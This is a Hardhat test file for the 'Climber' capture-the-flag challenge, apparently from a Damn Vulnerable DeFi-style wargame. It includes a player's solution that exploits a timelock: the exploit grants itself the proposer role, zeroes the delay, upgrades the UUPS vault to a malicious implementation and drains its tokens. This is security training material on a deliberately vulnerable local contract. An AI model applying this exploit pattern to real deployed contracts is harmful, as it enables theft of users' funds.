const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
        
        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // 1. deploy the malicious implementation
        const maliciousImplementationFactory = await ethers.getContractFactory("ClimberVaultMaliciousImplementation", player)
        const maliciousImplementation = await maliciousImplementationFactory.deploy()

        // 2. deploy the attacker contract
        const climberExploiterFactory = await ethers.getContractFactory("ClimberExploiter", player)
        const climberExploiter = await climberExploiterFactory.deploy(
            token.address,
            timelock.address,
            vault.address
        )

        // 3. build the ClimberTimelock::execute() calldatas
        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"))

        // 3.1 Timelock:grantRole(PROPOSER_ROLE, climberExploiter) -> so he can call schedule() later
        const grantRoleOperation = new ethers.utils.Interface(
            ["function grantRole(bytes32 role, address account)"]
        ).encodeFunctionData("grantRole", [PROPOSER_ROLE, climberExploiter.address])

        // 3.2 Timelock:updateDelay(0)
        const updateDelayOperation = new ethers.utils.Interface(
            ["function updateDelay(uint64 newDelay)"]
        ).encodeFunctionData("updateDelay", [0])

        // 3.3 upgrade the ClimberVault logic to our malicious one
        const updateImplementationOperation = new ethers.utils.Interface(
            ["function upgradeTo(address newImplementation)"]
        ).encodeFunctionData("upgradeTo", [maliciousImplementation.address])

        // 4.4 call ClimberExploiyer:exploit()
        const scheduleOperation = new ethers.utils.Interface(
            ["function exploit()"]
        ).encodeFunctionData("exploit", undefined)

        // 4.5 pre-calculate the calldata arrays to avoid the problem I was facing initially
        const targets = [timelock.address, timelock.address, vault.address, climberExploiter.address]
        const operations = [grantRoleOperation, updateDelayOperation, updateImplementationOperation, scheduleOperation]

        // 5. setABI on the exploiter contract
        await climberExploiter.connect(player).setABI(targets, operations);

        // 6. call Timelock:execute
        await timelock.connect(player).execute(
            targets,
            [0, 0, 0, 0],
            operations,
            ethers.utils.hexZeroPad("0x00", 32) // salt = address(0)
        )

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
